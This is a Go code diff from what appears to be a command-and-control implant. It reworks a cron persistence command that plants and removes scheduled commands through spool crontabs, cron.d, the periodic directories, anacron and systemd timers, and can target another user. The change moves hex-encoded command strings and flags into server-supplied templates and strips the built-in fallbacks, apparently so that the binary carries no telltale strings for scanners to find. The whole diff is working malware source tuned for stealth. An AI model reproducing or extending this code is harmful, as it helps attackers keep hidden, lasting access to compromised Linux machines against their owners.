@@ -62,29 +62,34 @@ const (
 	idxTimerPersistent   = 78
 	idxTimerExt          = 79
 	idxTimerDefaultName  = 80
+
+	// Timer calendar values (systemd OnCalendar= values)
+	idxTimerCalHourly  = 90
+	idxTimerCalDaily   = 91
+	idxTimerCalWeekly  = 92
+	idxTimerCalMonthly = 93
+	idxTimerCalBootMin = 94
+
+	// Cron flags
+	idxCronFlagMethod   = 95
+	idxCronFlagUser     = 96
+	idxCronFlagInterval = 97
+	idxCronFlagCommand  = 98
+
+	// Cron methods (already defined on server)
+	idxCronMethodSpool    = 81
+	idxCronMethodCrond    = 82
+	idxCronMethodPeriodic = 83
+	idxCronMethodAnacron  = 84
+	idxCronMethodTimer    = 85
+	idxCronMethodAll      = 86
+
+	// Cron actions (already defined on server)
+	idxCronActionAdd    = 87
+	idxCronActionRemove = 88
+	idxCronActionList   = 89
 )
 
-// Cron persistence strings - short codes transformed by server
-var (
-	// Actions (short, transformed if needed)
-	cronActionAdd    = string([]byte{0x61, 0x64, 0x64})                   // add
-	cronActionRemove = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65}) // remove
-	cronActionList   = string([]byte{0x6c, 0x69, 0x73, 0x74})             // list
-
-	// Short flags (transformed from user-friendly flags on server side)
-	cronFlagMethod   = string([]byte{0x2d, 0x6d}) // -m
-	cronFlagUser     = string([]byte{0x2d, 0x39}) // -9
-	cronFlagInterval = string([]byte{0x2d, 0x69}) // -i
-	cronFlagCommand  = string([]byte{0x2d, 0x36}) // -6
-
-	// Methods (short codes transformed by server)
-	cronMethodSpool    = string([]byte{0x73, 0x70})       // sp (from spool)
-	cronMethodCrond    = string([]byte{0x63, 0x64})       // cd (from crond)
-	cronMethodPeriodic = string([]byte{0x70, 0x72})       // pr (from periodic)
-	cronMethodAnacron  = string([]byte{0x61, 0x6e})       // an (from anacron)
-	cronMethodTimer    = string([]byte{0x74, 0x6d})       // tm (from timer)
-	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c}) // all
-)
 
 // CronPersistenceCommand handles cron-based persistence
 type CronPersistenceCommand struct {
@@ -92,19 +97,10 @@ type CronPersistenceCommand struct {
 }
 
 // getTpl safely gets template value by index
+// No fallbacks - templates are always provided by server
 func (c *CronPersistenceCommand) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
-		val := c.tpl.Templates[idx]
-		if val != "" {
-			return val
-		}
-	}
-	// Minimal fallbacks for essential values only
-	switch idx {
-	case idxCronIntHourly:
-		return "@hourly"
-	case idxProcSelfExe:
-		return "/proc/self/exe"
+		return c.tpl.Templates[idx]
 	}
 	return ""
 }
@@ -133,11 +129,11 @@ func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) Com
 	}
 
 	switch action {
-	case cronActionAdd:
+	case c.getTpl(idxCronActionAdd):
 		return c.addCronPersistence(args[1:])
-	case cronActionRemove:
+	case c.getTpl(idxCronActionRemove):
 		return c.removeCronPersistence(args[1:])
-	case cronActionList:
+	case c.getTpl(idxCronActionList):
 		return c.listCronPersistence()
 	default:
 		// Unknown action - treat as flags for add
@@ -150,27 +146,27 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 	var targetUser string
 	var interval string
 	var command string
-	var method string = cronMethodAll // Default to all methods
+	var method string = c.getTpl(idxCronMethodAll) // Default to all methods
 
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case cronFlagMethod:
+		case c.getTpl(idxCronFlagMethod):
 			if i+1 < len(args) {
 				method = args[i+1]
 				i++
 			}
-		case cronFlagUser:
+		case c.getTpl(idxCronFlagUser):
 			if i+1 < len(args) {
 				targetUser = args[i+1]
 				i++
 			}
-		case cronFlagInterval:
+		case c.getTpl(idxCronFlagInterval):
 			if i+1 < len(args) {
 				interval = args[i+1]
 				i++
 			}
-		case cronFlagCommand:
+		case c.getTpl(idxCronFlagCommand):
 			if i+1 < len(args) {
 				command = args[i+1]
 				i++
@@ -207,27 +203,27 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 
 	// Execute based on selected method
 	switch method {
-	case cronMethodSpool:
+	case c.getTpl(idxCronMethodSpool):
 		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
 			results = append(results, result)
 		}
-	case cronMethodCrond:
+	case c.getTpl(idxCronMethodCrond):
 		if result := c.addViaCronD(targetUser, interval, command); result != "" {
 			results = append(results, result)
 		}
-	case cronMethodPeriodic:
+	case c.getTpl(idxCronMethodPeriodic):
 		if result := c.addViaCronDirectories(command, interval); result != "" {
 			results = append(results, result)
 		}
-	case cronMethodAnacron:
+	case c.getTpl(idxCronMethodAnacron):
 		if result := c.addViaAnacron(command); result != "" {
 			results = append(results, result)
 		}
-	case cronMethodTimer:
+	case c.getTpl(idxCronMethodTimer):
 		if result := c.addViaSystemdTimer(interval, command); result != "" {
 			results = append(results, result)
 		}
-	case cronMethodAll:
+	case c.getTpl(idxCronMethodAll):
 		// Try all methods (timer first since it doesn't need root)
 		if result := c.addViaSystemdTimer(interval, command); result != "" {
 			results = append(results, result)
@@ -491,19 +487,26 @@ func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
 	onCalendar := c.getTpl(idxTimerOnCalendar)
 	onBootSec := c.getTpl(idxTimerOnBootSec)
 
+	// Timer calendar values
+	calHourly := c.getTpl(idxTimerCalHourly)
+	calDaily := c.getTpl(idxTimerCalDaily)
+	calWeekly := c.getTpl(idxTimerCalWeekly)
+	calMonthly := c.getTpl(idxTimerCalMonthly)
+	calBootMin := c.getTpl(idxTimerCalBootMin)
+
 	switch interval {
-	case intHourly, "@hourly":
-		timerSpec = onCalendar + "hourly"
-	case intDaily, "@daily":
-		timerSpec = onCalendar + "daily"
-	case intWeekly, "@weekly":
-		timerSpec = onCalendar + "weekly"
-	case intMonthly, "@monthly":
-		timerSpec = onCalendar + "monthly"
-	case intReboot, "@reboot":
-		timerSpec = onBootSec + "1min"
+	case intHourly:
+		timerSpec = onCalendar + calHourly
+	case intDaily:
+		timerSpec = onCalendar + calDaily
+	case intWeekly:
+		timerSpec = onCalendar + calWeekly
+	case intMonthly:
+		timerSpec = onCalendar + calMonthly
+	case intReboot:
+		timerSpec = onBootSec + calBootMin
 	default:
-		timerSpec = onCalendar + "hourly"
+		timerSpec = onCalendar + calHourly
 	}
 
 	timerHeader := c.getTpl(idxTimerHeader)
@@ -561,16 +564,16 @@ func (c *CronPersistenceCommand) convertInterval(interval string) string {
 // removeCronPersistence removes cron persistence
 func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
 	var targetUser string
-	var method string = cronMethodAll
+	var method string = c.getTpl(idxCronMethodAll)
 
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case cronFlagMethod:
+		case c.getTpl(idxCronFlagMethod):
 			if i+1 < len(args) {
 				method = args[i+1]
 				i++
 			}
-		case cronFlagUser:
+		case c.getTpl(idxCronFlagUser):
 			if i+1 < len(args) {
 				targetUser = args[i+1]
 				i++
@@ -588,27 +591,27 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 	var results []string
 
 	switch method {
-	case cronMethodSpool:
+	case c.getTpl(idxCronMethodSpool):
 		results = append(results, c.removeSpoolCron(targetUser)...)
 
-	case cronMethodCrond:
+	case c.getTpl(idxCronMethodCrond):
 		if result := c.removeCronD(); result != "" {
 			results = append(results, result)
 		}
 
-	case cronMethodPeriodic:
+	case c.getTpl(idxCronMethodPeriodic):
 		results = append(results, c.removeCronDirectories()...)
 
-	case cronMethodAnacron:
+	case c.getTpl(idxCronMethodAnacron):
 		if err := c.cleanAnacron(); err == nil {
 			anacronTab := c.getTpl(idxCronEtcAnacrontab)
 			results = append(results, SuccCtx(S2, anacronTab))
 		}
 
-	case cronMethodTimer:
+	case c.getTpl(idxCronMethodTimer):
 		results = append(results, c.removeSystemdTimer()...)
 
-	case cronMethodAll:
+	case c.getTpl(idxCronMethodAll):
 		results = append(results, c.removeSpoolCron(targetUser)...)
 		if result := c.removeCronD(); result != "" {
 			results = append(results, result)
